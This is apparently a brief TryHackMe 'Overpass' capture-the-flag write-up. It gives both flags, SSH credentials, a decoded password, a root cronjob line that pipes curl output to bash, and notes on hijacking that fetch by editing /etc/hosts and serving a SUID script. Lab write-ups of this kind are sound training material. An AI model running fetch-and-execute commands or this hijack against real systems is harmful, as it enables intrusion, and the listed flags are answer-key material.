# TryHackMe Overpass

# Saikat Karmakar | Jan 12:2021

1. Hack the machine and get the flag in user.txt
```
thm{65c1aaf000506e56996822c6281e6bf7}
```
2. Escalate your privileges and get the flag in root.txt
```
thm{7f336f8c359dbac18d54fdd64ea753bb}
```


***Notes***
ssh creds
```
id = james
pass = james13
```

decrepted ROT47 data from the ~/.overpass file
```
[{"name":"System","pass":"saydrawnlyingpicture"}]
```

intersting linpeas info (cronjob)
```
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

```
add our ip to the /etc/hosts file && set up a script with suid bits as the same path as the cronjob is accessing
```
